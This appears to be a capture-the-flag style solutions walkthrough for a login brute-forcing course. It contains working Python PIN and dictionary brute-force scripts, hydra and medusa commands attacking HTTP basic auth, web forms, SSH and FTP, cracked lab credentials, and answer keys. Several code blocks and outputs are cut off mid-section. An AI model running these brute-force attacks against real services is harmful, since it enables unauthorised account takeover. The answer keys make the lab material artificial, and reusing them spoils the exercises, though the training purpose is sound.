# Brute Force Attacks

## Question 1

### "After successfully brute-forcing the PIN, what is the full flag the script returns?"

After spawning the target, students will save the following Python3 PIN brute-force script as `solver.py` based on their STMIP and STMPO in the `ip` and `port` variables:

Code: python3

```python3
import requests

ip = "STMIP"  # Change this to your instance IP address
port = STMPO       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    
    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Subsequently, students will run the script and will attain the correct PIN code and gain the flag:

Code: shell

```shell
python3 solver.py
```

```

# Dictionary Attacks

## Question 1

### "After successfully brute-forcing the target using the script, what is the full flag the script returns?"

After spawning the target, students will save the following Python3 PIN brute-force script as `solver.py` based on their STMIP and STMPO in the `ip` and `port` variables:

Code: python3

```python3
import requests

ip = "STMIP"  # Change this to your instance IP address
port = STMPO       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    
    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'

# Basic HTTP Authentication

## Question 1

### "After successfully brute-forcing, and then logging into the target, what is the full flag you find?"

After spawning the target, students will use `hydra` to brute-force the log-in of the `basic-auth-user` found in the section and download the wordlist `2023-200_most_used_passwords.txt`, which will be used as a dictionary for the password:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt STMIP http-get / -s STMPO

# Login Forms

## Question 1

### "After successfully brute-forcing, and then logging into the target, what is the full flag you find?"

After spawning the target, students will open `Firefox` and will navigate to the target's page. They will presented with a log-in form, and students will submit any credentials (`htb-student:htb-student`) to get the failure condition for `hydra`.

![[HTB Solutions/CBBH/z. images/221cb896526adb5e803170f4b90c8736_MD5.jpg]]

Students will open a terminal and send a GET request using `cURL` to the target to obtain the web page's source code and the respective input fields of `username` and `password`.

Code: shell

```shell
curl http://STMIP:STMPO | tail -11
```

```

```

Subsequently, students will download the `top-usernames-shortlist.txt` and `2023-200_most_used_passwords.txt` wordlists:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

```

Students will use `hydra` to perform a log-in brute-force using the `top-usernames-shortlist.txt` as the username list and `2023-200_most_used_passwords.txt` as the password list and the failure condition:

Code: shell

```shell

# Web Services

## Question 1

### "What was the password for the ftpuser?"

After spawning the target, students will install `medusa` using the apt repository:

Code: shell

```shell
sudo apt install medusa
```

```
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-sbvtgbegel]─[~]

└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
```

Students will use `medusa` to perform an SSH brute-force against the `sshuser` from the section using the downloaded wordlist:

Code: shell

```shell
medusa -h STMIP -n STMPO -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

```

sshuser@ng-8414-loginbfservice-of7kt-7fd949d965-pt5d2:~$
```

Subsequently, students will enumerate the services on the machine running locally using `nmap` and discovering an FTP service running on port `21`:

Code: shell

```shell
nmap localhost
```

```
sshuser@ng-8414-loginbfservice-of7kt-7fd949d965-pt5d2:~$ nmap localhost

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

Students will perform a brute-force against the FTP service, targeting the `ftpuser` user using the `2020-200_most_used_passwords.txt` wordlist located in the `/home/sshuser` directory using medusa:

Code: shell

```shell
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

```
sshuser@ng-8414-loginbfservice-of7kt-7fd949d965-pt5d2:~$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Answer: `qqww1122`

# Web Services

## Question 2

### "After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?"

Students will reuse the previously established SSH session and will connect to the FTP service using the previously found password:

Code: shell

```shell
ftp ftp://ftpuser:qqww1122@localhost
```

```
sshuser@ng-8414-loginbfservice-of7kt-7fd949d965-pt5d2:~$ ftp ftp://ftpuser:qqww1122@localhost

```

Subsequently, students will query the files on the FTP service and download `flag.txt` to attain the flag:

Code: shell

```shell
ls
get flag.txt
!cat flag.txt
```

```

After generating the wordlist, students will proceed to truncate it to adhere to a six-character length string (words), that have at least one uppercase letter, one lowercase letter, and two special characters:

Code: shell

```shell
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

# Skills Assessment Part 1

## Question 1

### "What is the password for the basic auth login?"

After spawning the target machine, students will download `top-usernames-shortlist.txt` and `2023-200_most_used_passwords.txt` wordlists:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/2023-200_most_used_passwords.txt
```

```
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt

└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/2023-200_most_used_passwords.txt
```

Students will use `cURL` to send a GET request to the target and inspect the headers from the response, noticing the usage of basic authentication indicated in the [WWW-Authenticate](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate) header:

Code: shell

```shell
curl -I http://STMIP:STMPO
```

```
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]

```

Subsequently, students will use `hydra` to perform brute-forcing using the `http-get` method and the downloaded wordlists to attain a valid username and password:

Code: shell

```shell
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt STMIP http-get / -s STMPO
```

Answer: `Admin123`

# Skills Assessment Part 1

## Question 2

### "After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?"

Students will send a GET request using `cURL` and specify the found credentials (`admin:Admin123`) to attain the username between the `<span>` tag for the second part of the Skills Assessment:

Code: shell

```shell
curl http://STMIP:STMPO -u "admin:Admin123" | tail
```

```

```

Answer: `satwossh`

# Skills Assessment Part 2

## Question 1

### "What is the username of the ftp user you find via brute-forcing?"

After spawning the target, students will download the `2023-200_most_used_passwords.txt` wordlist:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/2023-200_most_used_passwords.txt
```

```
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/2023-200_most_used_passwords.txt
```

Subsequently, students will perform an SSH brute-force using the username `satwossh` and the wordlist with hydra to attain the password of the user:

Code: shell

```shell
hydra -l satwossh -P 2023-200_most_used_passwords.txt ssh://STMIP:STMPO
```

```

Students will connect via SSH using the credentials `satwossh:password1`:

Code: shell

```shell
ssh satwossh@STMIP -p STMPO
```

```

Subsequently, students will list the files in the current working directory, finding an `IncidentReport.txt` file holding information about a user (`Thomas Smith`):

Code: shell

```shell
ls
cat IncidentReport.txt
```

```

System Logs - Security Report

Date: 2024-09-06

Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.

```

Students will utilise `nmap` to scan the host locally and uncover the FTP service running on port `21`:

Code: shell

```shell
nmap localhost
```

```
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-30 11:37 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Subsequently, students will use `medusa` to perform an FTP brute-force using the previously generated username list and the password list located in the `/home/satwossh` directory to obtain valid credentials:

Code: shell

```shell
medusa -h 127.0.0.1 -U thomas_smith.txt -P passwords.txt -M ftp -t 5 | grep "ACCOUNT FOUND"
```

```
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ medusa -h 127.0.0.1 -U thomas_smith.txt -P passwords.txt -M ftp -t 5 | grep "ACCOUNT FOUND"

ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: {hidden} Password: chocolate! [SUCCESS]
```

Answer: `thomas`

# Skills Assessment Part 2

## Question 2

### "What is the flag contained within flag.txt"

Students will reuse the previously established SSH session and will connect to the FTP service using the found credentials

Code: shell

```shell
ftp ftp://thomas:chocolate\!@localhost
```

```
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ ftp ftp://thomas:chocolate\!@localhost

Trying [::1]:21 ...

331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp>
```

Subsequently, students will list the files in the FTP service, download the `flag.txt` and obtain the flag:

```shell
ls
get flag.txt
!cat flag.txt
```
```
ftp> ls
